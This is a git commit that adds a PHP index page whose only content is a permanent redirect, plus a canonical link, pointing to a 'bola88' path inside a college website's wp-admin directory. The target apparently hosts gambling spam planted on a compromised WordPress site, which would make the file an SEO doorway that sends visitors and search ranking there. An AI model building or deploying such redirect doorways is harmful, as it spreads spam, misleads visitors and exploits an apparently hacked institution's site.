ecab8315c60e8356bde42201e773f60a6bc97ef7
rishan828-cr1 <107803201+rishan828-cr1@users.noreply.github.com>
2022-12-08 11:50:28 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,8 @@
+<?php
+header("HTTP/1.1 301 Moved Permanently");
+header("Location: https://www.sxccal.edu/wp-admin/bola88/");
+?>
+
+<!doctype html> <html>
+<head><link rel="canonical" itemprop="mainEntityOfPage" href="https://www.sxccal.edu/wp-admin/bola88/"/></head><body></body></html>
+
